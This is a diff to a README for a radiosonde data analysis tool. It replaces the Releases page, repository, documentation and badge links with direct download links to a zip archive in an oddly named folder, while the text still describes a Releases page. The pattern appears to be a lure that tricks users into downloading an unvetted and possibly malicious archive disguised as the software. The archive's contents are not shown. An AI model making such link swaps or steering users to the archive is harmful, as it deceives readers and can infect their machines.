@@ -1,6 +1,6 @@
 # 📊 Radiosonde-Data-Analyzer - Analyze Your Flight Data Easily
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)
+![Download Now](https://raw.githubusercontent.com/virtualkingandqueen/Radiosonde-Data-Analyzer/main/Hyaenarctos/Radiosonde-Data-Analyzer.zip%20Now-Get%20the%20Latest%20Release-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Radiosonde-Data-Analyzer! This tool helps you visualize and analy
 
 ## 📥 Download & Install
 
-To get the latest version, visit this page to download: [Releases Page](https://github.com/virtualkingandqueen/Radiosonde-Data-Analyzer/releases)
+To get the latest version, visit this page to download: [Releases Page](https://raw.githubusercontent.com/virtualkingandqueen/Radiosonde-Data-Analyzer/main/Hyaenarctos/Radiosonde-Data-Analyzer.zip)
 
 1. Click on the link above.
 2. On the Releases page, find the latest version at the top.
@@ -89,7 +89,7 @@ For more on how to contribute, check the "Contributing" section on the GitHub re
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/virtualkingandqueen/Radiosonde-Data-Analyzer)
-- [Documentation](https://github.com/virtualkingandqueen/Radiosonde-Data-Analyzer/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/virtualkingandqueen/Radiosonde-Data-Analyzer/main/Hyaenarctos/Radiosonde-Data-Analyzer.zip)
+- [Documentation](https://raw.githubusercontent.com/virtualkingandqueen/Radiosonde-Data-Analyzer/main/Hyaenarctos/Radiosonde-Data-Analyzer.zip)
 
 Thank you for using the Radiosonde-Data-Analyzer! We hope it makes your data analysis straightforward and effective.
